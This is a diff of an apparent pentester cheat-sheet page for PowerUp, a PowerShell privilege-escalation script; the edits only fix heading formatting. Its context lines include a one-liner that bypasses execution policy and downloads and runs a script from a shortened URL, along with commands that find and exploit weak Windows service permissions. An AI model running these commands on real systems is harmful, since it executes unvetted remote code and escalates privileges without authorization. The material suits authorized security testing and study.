@@ -1,6 +1,6 @@
 # Powerup
 
-##Initial Execution
+## Initial Execution
 
 ```
 # Load from disk
@@ -20,15 +20,15 @@ powershell.exe -exec bypass -Command “& {Import-Module .\PowerUp.ps1; Invoke-A
 powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/1mK64oH’); Invoke-AllChecks”
 ```
 
-##Commands
+## Commands
 
-###Miscellaneous
+### Miscellaneous
 
-###Services
+### Services
 
-###Registry
+### Registry
 
-##References
+## References
 [PowerUp Cheatsheet For Pentesters - Cyber Security Research BlogsCyber Security Research Blogs](https://blog.certcube.com/powerup-cheatsheet/)[PowerSploitpowersploit.readthedocs.io](https://powersploit.readthedocs.io/en/latest/#overview)Last updated 10 months ago- [Initial Execution](#initial-execution)
 - [Commands](#commands)
 - [Miscellaneous](#miscellaneous)
@@ -54,7 +54,7 @@ Get-ServiceUnquoted -Verbose
 # Get services where current user can write to binary path
 Get-ModifiableServiceFile -Verbose
 
-#Get the services whose configuration the current user can modify
+# Get the services whose configuration the current user can modify
 Get-ModifiableService -Verbose
 
 # Exploit vulnerable service
